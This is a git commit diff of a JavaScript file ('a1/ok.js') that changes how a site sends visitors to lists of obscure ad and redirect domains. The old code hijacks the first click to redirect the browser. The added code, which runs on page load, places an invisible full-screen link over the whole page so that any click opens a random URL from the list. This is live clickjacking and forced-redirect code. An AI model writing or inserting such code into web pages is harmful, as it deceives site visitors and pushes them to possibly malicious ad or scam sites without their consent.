004af6a6b8c65a738dec2f9fa4446aa2d85c36f7
John <John@qq.com>
2024-09-04 11:58:17 +0800

    change a1 web

--- a1/ok.js
+++ a1/ok.js
@@ -1,57 +1,29 @@
-// 定义链接数组
-var urls = [
-  // hil: db
-  "https://grim-package.com/bO3WV.0sPU3rp/vSbumMVaJkZVD/0U1/N/DDMG2sOOTWcm2zL-TSUR0mMhzbYS5oNYz/cJ",
-  // "https://www.qrcreate.online",
-  // hil: db123 
-  "https://classic-bonus.com/bY3.VK0OPK3tpYv/bYmQVDJ-Z/DI0/1/MKzqcYy/MQzzATy/LMTSUGz/NNzTIrzDMXDgMm",
-  // mon: db
-  // "https://nutchaungong.com/4/7420689",
-  // "https://maipheeg.com/4/7474716",
-  // "https://glocheexi.com/4/7237941",
-  "https://coawoaph.net/4/7237942",
-  "https://laichegloavy.com/4/7631332",
+function createLink() {
+  var urls = [
+    // hil: db (ss)
+    "https://grim-package.com/b.3yVi0OPz3/pDvqblmoVxJWZ_DC0/1ZNhDOM/2KO/TacQ2HL/TiUO0JMmzLYw5-NizhcK",
+    "https://www.qrcreate.online",
 
-  // "https://vorsoutseemt.com/4/7436813",
-  // "https://eedootefaug.net/4/7420698",
-  // "https://futseerdoa.com/4/7237921",
-  // "https://eeboazurg.net/4/7420696",
-  // "https://psauwaun.com/4/7614690",
-  // "https://ptougeegnep.net/4/7237907",
-];
+    // mon: lucy
+    "https://phuruxoods.com/4/7683326",
+    "https://whauzavouweb.com/4/7683329",
+    "https://naglelri.net/4/7683327",
+    "https://fouwhigrezi.net/4/7683328",
+    // "https://boovoogie.net/4/7683330",
+    // "https://rangauck.com/4/7683319",
+    
+    // "https://json.qrcreate.online",
+    // "https://dubzenom.com/4/7782127",
+  ];
 
-// function createLink() {
-//   if (urls.length === 0) {
-//     return;
-//   }
-//   var a = document.createElement('a');
-//   a.href = urls[Math.floor(Math.random() * urls.length)];
-//   a.rel = 'noopener noreferrer';
-//   a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
-//   document.body.appendChild(a);
-// }
-
-function addClickLisener() {
-  var didOpen = false;
-  document.addEventListener("click", function() {
-    if (didOpen) {
-      return;
-    }
-    didOpen = true;
-    setTimeout(() => {
-      didOpen = false;
-    }, 3000);
-  
-    var randomIndex = Math.floor(Math.random() * urls.length);
-    var randomLink = urls[randomIndex];
-    window.location.href = randomLink;
-  });
+  if (urls.length === 0) {
+    return;
+  }
+  var a = document.createElement('a');
+  a.href = urls[Math.floor(Math.random() * urls.length)];
+  a.rel = 'noopener noreferrer';
+  a.style.cssText = 'position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; opacity: 0;';
+  document.body.appendChild(a);
 }
 
-function init() {
-  setTimeout(() => {
-    addClickLisener();
-  }, 1000);
-}
-
-document.addEventListener('DOMContentLoaded', init);
+document.addEventListener('DOMContentLoaded', createLink);
